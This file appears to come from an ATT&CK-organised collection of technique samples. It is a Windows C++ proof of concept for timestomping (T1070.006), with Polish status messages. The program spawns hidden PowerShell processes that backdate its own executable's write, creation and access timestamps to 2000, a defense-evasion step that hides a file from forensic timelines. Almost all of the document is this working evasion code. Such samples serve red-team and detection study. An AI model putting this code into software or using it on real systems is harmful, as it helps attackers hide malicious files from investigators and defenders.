---
title: ".006.Timestomp"
folder: "07. Defense Evasion/T1070 Indicator Removal"
---


#include <windows.h>
#include <fstream>
#include <iostream>


void Write() {

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    char command[1024];
    const char* date = "01/01/2000 11:11:11";
    sprintf_s(command, sizeof(command), "powershell.exe -command \"Start-Sleep -Seconds 4; (Get-Item '%s').LastWriteTime = '%s'\"", exePath, date);

    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;

    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        std::cout << "PowerShell uruchomiony jako niezależny proces." << std::endl;

        CloseHandle(pi.hThread);
    }
    else {
        std::cerr << "Nie udało się uruchomić procesu PowerShell." << std::endl;
    }
}

void Creation() {

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);


    char command[1024];
    const char* date = "01/01/2000 11:11:11";
    sprintf_s(command, sizeof(command), "powershell.exe -command \"Start-Sleep -Seconds 5; (Get-Item '%s').CreationTime  = '%s'\"", exePath, date);

    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;

    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        std::cout << "PowerShell uruchomiony jako niezależny proces." << std::endl;

        CloseHandle(pi.hThread);
    }
    else {
        std::cerr << "Nie udało się uruchomić procesu PowerShell." << std::endl;
    }
}
void Access() {

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    char command[1024];
    const char* date = "01/01/2000 11:11:11";
    sprintf_s(command, sizeof(command), "powershell.exe -command \"Start-Sleep -Seconds 6; (Get-Item '%s').LastAccessTime  = '%s'\"", exePath, date);

    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;

    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        std::cout << "PowerShell uruchomiony jako niezależny proces." << std::endl;

        CloseHandle(pi.hThread);
    }
    else {
        std::cerr << "Nie udało się uruchomić procesu PowerShell." << std::endl;
    }
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {


    Write();
    Access();
    Creation();
    return 0;
}